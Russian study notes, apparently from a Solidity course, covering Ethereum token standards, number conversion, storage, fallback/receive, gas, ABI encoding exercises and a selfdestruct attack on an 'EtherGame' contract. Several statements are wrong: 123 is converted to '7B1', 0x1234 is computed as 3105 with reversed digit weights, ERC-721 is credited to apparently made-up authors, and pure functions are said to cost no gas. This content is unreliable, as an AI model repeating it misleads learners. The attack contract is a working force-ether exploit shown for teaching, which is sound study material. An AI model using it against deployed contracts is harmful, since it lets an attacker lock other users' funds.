* **Отсутствие уникальности:** взаимозаменяемые токены не уникальны, что может снизить их ценность для некоторых пользователей.
* **Ограничения:** взаимозаменяемые токены могут иметь ограничения в использовании, такие как ограничения на количество транзакций или время жизни.

В целом, взаимозаменяемые токены являются удобным и безопасным способом представления цифровых активов. Они имеют ряд преимуществ, но также имеют некоторые недостатки.
# 15. Что такое экосистема Ethereum?
Экосистема Ethereum - это совокупность всех приложений, сервисов и продуктов, построенных на базе блокчейна Ethereum. Экосистема Ethereum включает в себя как децентрализованные приложения (DApps), так и традиционные приложения, которые используют технологии Ethereum.

Экосистема Ethereum является одной из крупнейших в мире экосистем блокчейна. В ней представлены проекты из различных отраслей, включая финансы, игры, искусство, бизнес и многое другое.

Вот некоторые из основных компонентов экосистемы Ethereum:

* **Криптовалюта ETH:** Эфириум (ETH) - это криптовалюта, которая используется для оплаты транзакций в сети Ethereum. ETH также используется для создания и управления DApps.
* **Смарт-контракты:** Смарт-контракты - это программы, которые выполняются на блокчейне Ethereum. Смарт-контракты могут использоваться для автоматизации различных задач, таких как передача денег, управление активами или голосование.
* **DApps:** DApps - это децентрализованные приложения, которые не принадлежат или не контролируются какой-либо одной организацией. DApps могут использоваться для различных целей, таких как обмен криптовалютами, игры, социальные сети и многое другое.
* **Инструменты и библиотеки:** В экосистеме Ethereum существует множество инструментов и библиотек, которые помогают разработчикам создавать DApps и другие приложения на базе Ethereum.

Экосистема Ethereum продолжает расти и развиваться. Новый проекты и продукты появляются в экосистеме Ethereum каждый день.

Вот некоторые из основных тенденций в экосистеме Ethereum:

* **Растущая популярность DeFi:** Децентрализованные финансы (DeFi) - это отрасль, которая использует технологии Ethereum для создания финансовых продуктов и услуг, которые не зависят от традиционных финансовых учреждений. DeFi является одной из самых быстрорастущих отраслей в экосистеме Ethereum.
* **Развитие NFT:** Невзаимозаменяемые токены (NFT) - это цифровые активы, которые уникальны и не могут быть заменены другими аналогичными активами. NFT используются для представления различных активов, таких как произведения искусства, спортивные карты, игровые предметы и многое другое.
* **Развитие метавселенных:** Метавселенные - это виртуальные миры, в которых люди могут взаимодействовать друг с другом и с цифровыми объектами. Метавселенные построены на базе технологий блокчейна, включая Ethereum.

Экосистема Ethereum имеет потенциал для изменения многих отраслей и сфер жизни. Она уже оказывает влияние на финансовую сферу, искусство, игры и многое другое.

Вот несколько примеров того, как экосистема Ethereum используется в различных отраслях:

* **Финансы:** Ethereum используется для создания децентрализованных финансовых продуктов и услуг, таких как децентрализованные биржи, децентрализованные кредитование и децентрализованные страхование.
* **Игры:** Ethereum используется для создания децентрализованных игр, в которых игроки могут владеть и обменивать игровыми предметами и активами.
* **Искусство:** Ethereum используется для создания NFT, которые представляют произведения искусства, такие как картины, фотографии и скульптуры.
* **Бизнес:** Ethereum используется для создания различных бизнес-приложений, таких как управление цепочками поставок, отслеживание активов и голосование.

Экосистема Ethereum продолжает расти и развиваться, и ее влияние на мир будет только усиливаться.
# 16. Что такое ERC721?
ERC-721 — это стандарт токенов для невзаимозаменяемых токенов (NFT) на блокчейне Ethereum. NFT — это уникальные цифровые активы, которые не могут быть заменены другими аналогичными активами. Они часто используются для представления произведений искусства, коллекционных предметов, игровых предметов и других активов, которые имеют ценность из-за своей уникальности.
[Image of Стандарт токенов ERC-721]

ERC-721 определяет набор функций и свойств, которые должен иметь NFT. Эти функции включают в себя:

* **ID:** Уникальный идентификатор токена.
* **Имя:** Название токена.
* **Описание:** Описание токена.
* **Свойства:** Дополнительные свойства токена, такие как изображение, звук или видео.
* **История владения:** История владельцев токена.

ERC-721 был разработан в 2017 году командой разработчиков, возглавляемой Джозефом Бэнсоном и Винсентом Пулленом. Он быстро стал одним из самых популярных стандартов NFT, и на его основе было создано множество NFT-проектов.

ERC-721 имеет ряд преимуществ перед другими стандартами NFT, такими как ERC-20. Он обеспечивает уникальность NFT, что делает их более ценными для коллекционеров и пользователей. Кроме того, ERC-721 позволяет хранить метаданные NFT, такие как изображения, звук или видео. Это позволяет создавать более сложные и интересные NFT.

ERC-721 используется в различных отраслях, включая искусство, игры и бизнес. Он имеет потенциал для изменения многих способов, которыми мы взаимодействуем с цифровыми активами.
# 17. А что за протокол 1155?
Формально протокол 1155 называется **ERC-1155**. Это сокращение от "Ethereum Request for Comments" (ERC), что означает "запрос на отзывы Ethereum". ERC-1155 — это стандарт, который был предложен командой разработчиков Ethereum и одобрен сообществом Ethereum.

Протокол 1155 также известен как **Multi Token Standard** (MTS), что означает "многотоковый стандарт". Это название отражает способность протокола 1155 создавать как взаимозаменяемые, так и невзаимозаменяемые токены.

В настоящее время протокол 1155 является одним из самых популярных стандартов NFT. Он используется в различных отраслях, включая искусство, игры и бизнес.
Протокол 1155 — это стандарт токенов для взаимозаменяемых и невзаимозаменяемых токенов (NFT) на блокчейне Ethereum. Он был разработан командой разработчиков Ethereum в 2018 году и является расширением стандарта ERC-721.
[Image of Протокол 1155]

Протокол 1155 позволяет использовать один и тот же смарт-контракт для создания как взаимозаменяемых, так и невзаимозаменяемых токенов. Это упрощает разработку и использование NFT, а также позволяет создавать более сложные и интересные NFT-проекты.

Протокол 1155 имеет ряд преимуществ перед другими стандартами токенов, такими как ERC-721 и ERC-20. Он обеспечивает более эффективное использование памяти и пропускной способности сети, а также позволяет создавать более сложные и интересные NFT.

Протокол 1155 используется в различных отраслях, включая искусство, игры и бизнес. Он имеет потенциал для изменения многих способов, которыми мы взаимодействуем с цифровыми активами.

Вот несколько примеров того, как протокол 1155 используется в различных отраслях:

* **Искусство:** Протокол 1155 используется для создания NFT, которые представляют произведения искусства, такие как картины, фотографии и скульптуры. Это позволяет художникам создавать более сложные и интересные NFT, а также продавать их более эффективно.
* **Игры:** Протокол 1155 используется для создания NFT, которые представляют игровые предметы, такие как оружие, броня и игровые персонажи. Это позволяет игрокам владеть и обменивать игровыми предметами более эффективно.
* **Бизнес:** Протокол 1155 используется для создания NFT, которые представляют различные бизнес-активы, такие как билеты на концерты, спортивные мероприятия и другие товары. Это позволяет бизнесу создавать более эффективные и надежные системы управления активами.
# 18. В чем разница между ERC20, ERC721 и ERC1155?

**ERC20** — это стандарт взаимозаменяемых токенов. Токены ERC20 идентичны друг другу и могут быть заменены другими аналогичными токенами.

**ERC721** — это стандарт невзаимозаменяемых токенов. Токены ERC721 уникальны и не могут быть заменены другими аналогичными токенами.

**ERC1155** — это стандарт, который объединяет возможности ERC20 и ERC721. Токены ERC1155 могут быть взаимозаменяемыми или невзаимозаменяемыми.

**Краткий ответ:**

| Стандарт | Тип токена |
|---|---|
| ERC20 | Взаимозаменяемый |
| ERC721 | Невзаимозаменяемый |
| ERC1155 | Взаимозаменяемый или невзаимозаменяемый |
># <center>04 / 01 / 2024<center>
># <center>05 / 01 / 2024<center>
# 19. Как перевести из десятичной в шестнадцатеричную(hexadecimal) систему счисления и обратно?
Чтобы перевести число из десятичной в шестнадцатеричную систему счисления, необходимо разделить это число на 16. Остаток от каждого деления будет шестнадцатеричной цифрой. Полученные шестнадцатеричные цифры необходимо записать в обратном порядке. В шестнадцатеричной системе счисления используются цифры от 0 до 9 и буквы от A до F. Буквы A, B, C, D, E и F имеют значения 10, 11, 12, 13, 14 и 15 соответственно.

Например, чтобы перевести число 123 в шестнадцатеричную систему счисления, необходимо выполнить следующие действия:

```
123 / 16 = 7, остаток = 11
```

Первая шестнадцатеричная цифра — это 11.

```
7 / 16 = 0, остаток = 7
```

Вторая шестнадцатеричная цифра — это 7.

```
0 / 16 = 0, остаток = 0
```

Третья шестнадцатеричная цифра — это 0.

```
7B1
```

Следовательно, шестнадцатеричное представление числа 123 равно **7B1**.

Более кратко:

* Делим десятичное число на 16.
* Записываем остаток от деления.
* Повторяем эти действия, пока результат деления не будет равен 0.
* Записываем полученные шестнадцатеричные цифры в обратном порядке.

В записи шестнадцатеричных чисел в начале стоит 0x, чтобы отличить их от десятичных чисел.

0x означает "шестнадцатеричное число".

Вот пример:

0x10 - это шестнадцатеричное число 16.

**Чтобы перевести число из шестнадцатеричной системы счисления в десятичную, необходимо выполнить следующие действия:**

1. Каждый разряд шестнадцатеричного числа умножить на весовую степень шестнадцатеричной системы счисления, начиная с младшего разряда.
2. Суммировать полученные значения.

Весовые степени шестнадцатеричной системы счисления:

* 16^0 = 1
* 16^1 = 16
* 16^2 = 256
* 16^3 = 4096
* ...

Например, чтобы перевести число 0x1234 в десятичную систему счисления, необходимо выполнить следующие действия:

```
0x1234 = (1 * 16^0) + (2 * 16^1) + (3 * 16^2) + (4 * 16^3)
```

```
= 1 + 32 + 512 + 2560
```

```
= 3105
```

Следовательно, десятичное представление числа 0x1234 равно 3105.

Более кратко:

* Каждый разряд шестнадцатеричного числа умножить на весовую степень шестнадцатеричной системы счисления, начиная с младшего разряда.
* Суммировать полученные значения.
# 20. Какое число помещается в uint256 и как это посчитать?
Число `uint256` в Solidity может хранить значения от 0 до 2^256 - 1. Это означает, что максимальное значение, которое может быть помещено в переменную типа `uint256`, равно 115792089237316195423570985008687907853269984665640564039457584007913129639935.

Для вычисления этого числа можно использовать формулу:

```python
2^n - 1
```

где `n` - количество битов, которые могут быть использованы для хранения числа. В случае `uint256` `n` равно 256.

Таким образом, максимальное значение `uint256` можно вычислить следующим образом:

```python
2^256 - 1
```

Это даст вам максимальное значение, которое может быть хранено в переменной типа `uint256`.
Формула `2^n - 1` используется для определения максимального значения, которое может быть представлено с помощью n битов. 

В двоичной системе счисления каждый бит может иметь одно из двух значений: 0 или 1. Таким образом, количество возможных значений, которые могут быть представлены с помощью n битов, равно 2^n. Однако, поскольку мы считаем начиная с нуля, мы уменьшаем общее количество возможных значений на единицу, получая `2^n - 1` [Source 1](https://www.rareskills.io/post/uint-max-value-solidity).
# 21. Что такое Storage в смарт-контрактах и как он работает?
Хранилище смарт-контракта — это место, где хранятся данные, необходимые для его работы. Оно является неизменяемым и может использоваться для хранения различных типов данных, таких как состояние контракта, метаданные и вспомогательные данные.

![image-2.png](attachment:image-2.png)

На фотографии есть три unsigned int 256 битовых. Один из них - константа, для него не резервируется место в Storage.
![image.png](attachment:image.png)
![image-3.png](attachment:image-3.png)
![image-4.png](attachment:image-4.png)
Константы не имеют slot в storage. Причина тому - то что константные значения являются частью смарт-контракта. В Solidity, константы и неизменяемые переменные не занимают места в хранилище контракта. Это происходит потому, что эти переменные включены непосредственно в байткод контракта. Когда компилятор Solidity встречает константу или неизменяемую переменную, он автоматически заменяет все ссылки на них их объявленными значениями. Это помогает оптимизировать использование хранилища и повышает эффективность работы контракта [Source 0](https://medium.com/@ajaotosinserah/a-comprehensive-guide-to-implementing-constant-and-immutable-variables-in-solidity-4026ebadc6aa), [Source 1](https://ethereum.stackexchange.com/questions/82259/what-is-the-difference-between-the-constant-and-immutable-keywords-in-solidity), [Source 2](https://soliditylang.org/blog/2020/05/13/immutable-keyword/).

Лектор говорит, что можно считать, что названия константных переменных - это просто указатель на значения в оперативной памяти.
![image-5.png](attachment:image-5.png)
Лектор говорит, что временные переменные тоже не сохраняются в хранилище смарт-контракта.

Документация Solidity: https://docs.soliditylang.org/en/v0.8.23/
# 22. Что такое fallback() и receive()?

В Solidity, смарт-контракты могут быть вызваны с помощью функции `call()`. Когда функция `call()` вызывается, она передает контракту определенный набор данных, называемый каллдатой. Каллдата представляет собой информацию, которую смарт-контракт должен обработать.

Если каллдата не соответствует ни одной из функций в контракте, то выполняется функция-запасная. В Solidity есть две встроенные функции-запасные: `fallback()` и `receive()`.

* **Функция `fallback()` выполняется, когда смарт-контракт вызывается с каллдатой, которая не соответствует ни одной из функций в контракте.**
* **Функция `receive()` выполняется, когда смарт-контракт получает эфир, но не предоставляется каллдата. Это означает, что смарт-контракт получает эфир, но не знает, какая функция должна быть вызвана для обработки этого эфира.**

**Как использовать функции fallback и receive?**

Функции `fallback()` и `receive()` можно использовать для различных целей. Вот несколько примеров:

* **Для обработки вызовов, которые не соответствуют ни одной из функций в контракте.** Например, смарт-контракт может использовать функцию `fallback()` для обработки вызовов, которые не соответствуют ни одной из функций контракта, но которые должны выполнять какие-то действия.
* **Для обработки вызовов с каллдатой, которая не соответствует ни одной из функций контракта.** Например, смарт-контракт может использовать функцию `receive()` для обработки вызовов, которые передают эфир, но не предоставляют каллдату.
* **Для защиты смарт-контракта от атак.** Например, смарт-контракт может использовать функцию `receive()` для проверки каллдаты перед тем, как выполнять какие-либо действия.

**Пример кода**

Вот короткий пример кода, который демонстрирует использование функций `fallback()` и `receive()`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract FallbackReceive {
   uint256 private value;

   receive() external payable {
       value += 1;
   }

   fallback() external payable {
       value += 1;
   }

   function getValue() public view returns(uint256) {
       return value;
   }
}
```

В этом примере, если смарт-контракт получает эфир без каллдаты, то выполняется функция `receive()`, которая увеличивает значение переменной `value` на 1. Если же смарт-контракт получает эфир с каллдатой, которая не совпадает ни с одной из функций контракта, то выполняется функция `fallback()`, которая также увеличивает значение переменной `value` на 1.

**Заключение**

Функции `fallback()` и `receive()` предоставляют гибкость для разработчиков смарт-контрактов. Эти функции позволяют смарт-контрактам обрабатывать вызовы, которые не соответствуют ни одной из функций в контракте.

![image.png](attachment:image.png)
# 23. Что за ключевые слова external payable?
Ключевое слово `external` в Solidity указывает, что функция может быть вызвана только из внешних источников, а не из других функций внутри того же контракта. Это ограничение помогает оптимизировать использование газа, так как Solidity не требует сохранять информацию о внутреннем вызове функции [Source 1](https://medium.com/@solidity101/100daysofsolidity-understanding-the-payable-keyword-in-solidity-62b09b73de83).

Ключевое слово `payable` позволяет функции принимать Ether. Без этого модификатора функция не может принимать Ether и любая попытка отправить Ether на такую функцию приведет к ошибке. Функции `receive()` и `fallback()` являются особыми случаями функций, которые могут быть помечены как `payable`, и они используются для обработки входящих транзакций Ether, которые не были направлены на конкретную функцию [Source 2](https://codedamn.com/news/solidity/payable-function-in-solidity-example-how-to-use-it).
# 24. Что такое газ?
В смарт-контрактах газ - это единица измерения вычислительных усилий, необходимых для выполнения операций в блокчейне Ethereum. Газ используется для оплаты транзакций, которые инициируют смарт-контракты.

Каждая операция в смарт-контракте потребляет определенное количество газа. Стоимость газа зависит от сложности операции. Например, операция, которая изменяет состояние контракта, потребляет больше газа, чем операция, которая просто читает данные из контракта.

Когда пользователь инициирует транзакцию, которая включает в себя вызов смарт-контракта, он должен заплатить за газ, необходимый для выполнения операции. Если пользователь не предоставит достаточно газа, транзакция будет отклонена.

Цена газа определяется на рынке. Пользователи могут покупать газ у майнеров, которые выполняют операции в блокчейне.

Вот несколько примеров того, как используется газ в смарт-контрактах: 

* **Для оплаты транзакций, которые инициируют смарт-контракты.** Например, когда пользователь отправляет эфир на адрес смарт-контракта, он должен заплатить за газ, необходимый для выполнения операции.
* **Для оплаты операций в смарт-контракте.** Например, когда пользователь вызывает функцию смарт-контракта, он должен заплатить за газ, необходимый для выполнения операции.
* **Для оплаты создания смарт-контракта.** Когда пользователь создает смарт-контракт, он должен заплатить за газ, необходимый для создания контракта.

Газ называется газом потому, что он похож на топливо, которое используется для выполнения операций в блокчейне Ethereum.
Газ является важной частью экосистемы Ethereum. Он обеспечивает стимулы для майнеров для выполнения операций в блокчейне и помогает предотвратить перегрузку сети.
# 25. Что за ключевое слово pragma в Solidity?
В Solidity слово **pragma** используется для указания директив компилятора. Директивы компилятора - это инструкции, которые сообщают компилятору, как обрабатывать код.

В Solidity существует несколько различных директив pragma, которые могут использоваться для различных целей. Некоторые из наиболее распространенных директив pragma включают:

* **pragma solidity ^0.8.7;** - указывает, что код должен быть скомпилирован с использованием версии Solidity 0.8.7 или более поздней.
* **pragma experimental;** - указывает, что код использует экспериментальные функции Solidity.
* **pragma abicoder;** - указывает, что код должен быть скомпилирован с использованием ABI-кодировщика.

Директива **pragma** всегда должна быть первой строкой в файле Solidity.

Вот пример кода, который использует директиву **pragma solidity ^0.8.7;** :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract MyContract {
  // ...
}
```

В этом примере директива **pragma solidity ^0.8.7;** указывает, что код контракта должен быть скомпилирован с использованием версии Solidity 0.8.7 или более поздней.

Директивы pragma могут использоваться для различных целей, чтобы помочь разработчикам Solidity создавать более безопасный и эффективный код.
# 26. Практическая часть в Lesson 10
Сперва мы зашли в remix.org и открыли онлайн-IDE. Там оставили default_workspace. Создали папку, назвали Contracts, внутри которого создали файл Encoding.sol
Внутри мы прописали
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract Encoding
{
    function combineStrings() public pure returns(string memory)
    {
        return string(abi.encodePacked("Hi Mom! ", "Miss You!"));
        // Результат будет такой string: Hi Mom! Miss You!
    }
}
```

В этом примере мы указали, что код должен быть скомпилирован с использованием версии Solidity 0.8.7 или более поздней. Была создана функция combineStrings(), где указан параметр public pure, который означает, что 

![image.png](attachment:image.png)
![image-2.png](attachment:image-2.png)

Каждый контракт имеет несколько транзакции, у транзакций есть входные данные(input data), он представляется в виде огромного числа команд, представленных в виде 16-чной системы счисления. Начинаются они с 00, и заканчиваются как FF значит их 16 * 16 = . Это называется двоичные(binary data) данные кода инициализации контракта.

Список значений этих команд можно найти по ссылке: https://www.evm.codes/?fork=shanghai

// When we send a transaction, it is "compiled" down to bytecode and sent in a "data" object of the transaction.
// That data object now governs how future transactions will interact with it.
// For example: https://etherscan.io/tx/0x112133a0a74af775234c077c397c8b75850ceb61840b33b23ae06b753da40490

// Now, in order to read and understand these bytes, you need a special reader.
// This is supposed to be a new contract? How can you tell?
// Let's compile this contract in hardhat or remix, and you'll see the "bytecode" output - that's what will be sent when
// creating a contract.

// This bytecode represents exactly the low level computer instructions to make our contract happen.
// These low level instructions are spread out into something called opcodes.

* **Продвигаемся далее по коду**

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

contract Encoding
{
    function combineStrings() public pure returns(string memory)
    {
        return string(abi.encodePacked("Hi Mom! ", "Miss You!"));
    }

    function encodeNumber() public pure returns(bytes memory)
    {
        bytes memory number = abi.encode(1);
        return number;
        //Результат будет такой bytes: 0x0000000000000000000000000000000000000000000000000000000000000001
    }

    // Создадим функцию для кодировки строки
    function encodeString() public pure returns(bytes memory)
    {
        bytes memory ans = abi.encode("Hello world");
        return ans;
        // Результат: 0:bytes: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000b48656c6c6f20776f726c64000000000000000000000000000000000000000000
    }

    // Так как возвращаемое значение было огромным, то есть просто физически большим, то будет хорошо
    // как то сократить расходование топлива, которое используется практически для любых
    // операций в смарт-контракте - газе.
    // Для того, чтобы сделать это нам нужно использовать функцию encodePacked.
    function encodeStringPacked() public pure returns(bytes memory)
    {
        bytes memory ans_str = abi.encodePacked("Hello world");
        return ans_str;
        //Результат куда меньше:     0: bytes: 0x48656c6c6f20776f726c64
    }

    // Это можно сделать другим способом:
    function encodeStringbytes() public pure returns(bytes memory)
    {
        bytes memory ans = bytes("Hello world");
        return ans;
        // Результат такой же как и сверху
        // Но лектор сказал, что способы реализации этих двух методов(то есть код внутри)
        // отличаются друг от друга
    }

    // Сейчас рассмотрим как работает abi.decode
    function decodeString() public pure returns(string memory)
    {
        string memory ans = abi.decode(encodeString(), (string));
        return ans;
        // Результат - Hello world!
    }

    // Рассмотрим как шифровать и расшифровать несколько значений сразу
    function encodeMultipleStrings() public pure returns(bytes memory)
    {
       bytes memory ans = abi.encode("some_string", "some_other_string");
       return ans; 
    }
    //Расшифровка
    function decodeMultipleStrings() public pure returns(string memory, string memory)
    {
        (string memory some_string, string memory some_other_string) = abi.decode(encodeMultipleStrings(), (string, string));
        return (some_string, some_other_string);
    }

    // Теперь попробуем поработать с encodePacked с несколькими строками
    // Сперва напишем функцию, которая не будет работать,
    // но потом напишем рабочую функцию

    function multiEncodePacked() public pure returns(bytes memory)
    {
        bytes memory ans = abi.encodePacked("some_string", "some_other_string");
        return ans;
    }

    function multiDecodePacked() public pure returns(string memory)
    {
        string memory some_string = abi.decode(encodeMultipleStrings(), (string));
        return some_string;
        //Результат будет some_string
        // Но мы хотели some_stringsome_other_string
    }
    // отсюда можно видеть что abi.decode не может расшифровывать Packed

    function multiFromBytesToStr() public pure returns(string memory)
    {
        string memory some_string = string(multiEncodePacked());
        return some_string;
        //Результат будет "some_stringsome_other_string"
    }
}
```
# 27. Что означает public pure при объявлении функции внутри контракта?
```
function combineStrings() public pure returns(string memory)
{
    return string(abi.encodePacked("Hi Mom! ", "Miss You!"));
}
```

 **`public pure` означает:**

- **`public`:** Функция доступна для вызова извне контракта.
- **`pure`:** Функция не изменяет состояние контракта и не использует газ при вызове.
# 28. Что означает returns(data_type memory) при объявлении функции?

Ключевое слово `memory` в `returns(тип_данных memory)` указывает, что возвращаемые значения функций хранятся в памяти контракта, а не в Storage. Это более эффективно и позволяет изменять значения во время выполнения функции.
# 29. Что такое ABI (Application Binary Interface)?
ABI (Application Binary Interface) - это стандарт, который определяет, как смарт-контракт взаимодействует с внешним миром, включая другие смарт-контракты и пользовательские интерфейсы.

ABI определяет следующие элементы:

* Имена функций и их сигнатуры.
* Типы данных параметров и возвращаемых значений.
* Порядок параметров.

ABI используется для следующих целей:

* Компиляция смарт-контрактов в машинный код.
* Создание пользовательских интерфейсов для взаимодействия со смарт-контрактами.
* Разработка инструментов для тестирования и анализа смарт-контрактов.

Вот пример ABI для простого смарт-контракта, который имеет одну функцию `add()`, которая добавляет два числа:

```
[
  {
    "name": "add",
    "type": "function",
    "inputs": [
      {
        "name": "a",
        "type": "uint256"
      },
      {
        "name": "b",
        "type": "uint256"
      }
    ],
    "outputs": [
      {
        "name": "result",
        "type": "uint256"
      }
    ]
  }
]
```

Этот ABI определяет, что функция `add()` имеет два параметра типа `uint256` и возвращает один параметр типа `uint256`.

ABI смарт-контракта можно получить из исходного кода контракта или из его двоичного кода.
># <center>06 / 01 / 2024<center>
# 30. Что такое EVM (Ethereum Virtual Machine)?
**EVM - это виртуальная машина, которая используется для выполнения смарт-контрактов на блокчейне Ethereum. Она является Turing-полной, что означает, что она может выполнять любые алгоритмы. EVM также безопасна и эффективна, что делает ее важной частью экосистемы Ethereum.**

**Вот несколько ключевых особенностей EVM:**

* **Turing-полнота:** EVM может выполнять любые алгоритмы, которые можно выразить на формальном языке Тьюринга. Это означает, что EVM может быть использована для создания смарт-контрактов, которые могут выполнять сложные операции, такие как вычисления, логика и управление.
* **Безопасность:** EVM разработана с учетом безопасности. Она использует различные механизмы безопасности, такие как блокчейн, для защиты от взлома и мошенничества.
* **Эффективность:** EVM разработана с учетом эффективности. Она использует различные оптимизации, чтобы минимизировать затраты газа на выполнение смарт-контрактов.

**EVM играет ключевую роль в экосистеме Ethereum. Она обеспечивает основу для создания и выполнения смарт-контрактов, которые являются основой многих приложений на Ethereum, включая децентрализованные приложения (DApps), децентрализованные финансы (DeFi) и смарт-контракты для управления активами.**

**Вот более простой вариант:**

**EVM - это машина, которая выполняет смарт-контракты на блокчейне Ethereum. Она может выполнять любые алгоритмы, безопасна и эффективна. EVM играет ключевую роль в экосистеме Ethereum.**
# 31. Что такое CALLDATA?
CALLDATA - это аргумент, который мы передаём контракту в качестве данных.

**CALLDATA можно использовать для следующих целей:**
* **Чтобы передать параметры функции смарт-контракту.**
* **Чтобы передать данные смарт-контракту.**

Вот пример использования CALLDATA:

```
function add(uint256 a, uint256 b) public payable 
{
  uint256 result = a + b;
  // Отправка результата операции в качестве аргумента функции
  emit Added(result);
}
```


В этом примере функция `add()` имеет два параметра типа `uint256`. Чтобы вызвать эту функцию в Remix IDE, вы должны ввести значения параметров в поле CALLDATA. Например, если вы хотите передать значения 10 и 20, вы должны ввести следующее в поле CALLDATA:

```
10
20
```

В этом случае функция `add()` будет вызвана с параметрами 10 и 20. Результат операции будет отправлен в качестве аргумента функции `emit`.
# 32. Практическая часть в Lesson 13
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
```

 **Объясняю код и его уязвимость:**

**Контракт EtherGame:**

- **Цель:** Собрать 7 эфиров по 1 от каждого игрока. 7-й игрок становится победителем и забирает весь приз.
- **Функции:**
    - `deposit()`: Принимает 1 эфир от игрока и проверяет, не достигнут ли целевой баланс. Если баланс достиг 7 эфиров, устанавливает победителя.
    - `claimReward()`: Позволяет победителю забрать весь накопленный эфир.

**Уязвимость:**

- Контракт имеет уязвимость, позволяющую злоумышленнику заблокировать игру и не дать никому победить.

**Контракт Attack:**

- **Цель:** Взломать игру EtherGame и заблокировать возможность победы.
- **Функции:**
    - `attack()`: Принимает эфир и отправляет его на контракт EtherGame, чтобы баланс контракта достиг 7 эфиров. Это блокирует возможность дальнейших депозитов и установки победителя.

**Как происходит атака:**

1. Разворачивается контракт EtherGame.
2. Игроки делают депозиты по 1 эфиру.
3. Разворачивается контракт Attack, которому передается адрес контракта EtherGame.
4. Вызывается функция `attack()` контракта Attack с отправкой 5 эфиров.
5. Баланс контракта EtherGame становится 7 эфиров.
6. Дальнейшие депозиты блокируются из-за условия `require(balance <= targetAmount, "Game is over");`
7. Победитель не может быть установлен, так как условие `if (balance == targetAmount) { ... }` больше не выполняется.

**Вывод:**

Игра EtherGame имеет уязвимость, которая позволяет злоумышленнику заблокировать игру и не дать никому победить. Это демонстрирует важность тщательного аудита смарт-контрактов перед их развертыванием.

># <center>Section 1: Review Завершён<center>